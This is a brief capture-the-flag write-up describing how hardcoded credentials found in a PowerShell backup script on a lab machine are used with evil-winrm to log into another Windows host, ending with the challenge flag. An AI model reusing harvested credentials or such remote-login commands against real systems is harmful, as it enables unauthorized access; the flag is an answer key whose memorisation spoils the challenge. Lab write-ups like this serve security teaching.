## [RV] Flag 3  

<img src="images/chall.png" width=600>

In the intern's machine in FLAG2, we can find a suspicious looking powershell script in `/UAT/Scripts/Backup`.  

<img src="images/script.png" width=600>

Inside the script, we find another set of credentials.  

```powershell
...
# ===========================
# Configuration
# ===========================

$Username         = "M.Chen@JEZZCORP.LOCAL"
$Password         = "H3aFq9Vp"    # DO NOT SHARE
$ServerName       = "MSSQL-SRV.JEZZCORP.LOCAL"
$DatabaseName     = "Prod"
$LogFile          = "C:\DBBackups\DBHealthCheck.log"
...
```

We can use the credentials to connect to third Windows machine.  

```bash
evil-winrm -i 10.3.10.30 -u 'JEZZCORP\M.Chen' -p H3aFq9Vp
```

The solve is similar to FLAG2, we just have to `cd` to `/Users` to find flag 3.  

<img src="images/flag3.png" width=600>

Flag: `YBN25{c5a6d991f459c3b74c193a88855b0d53}`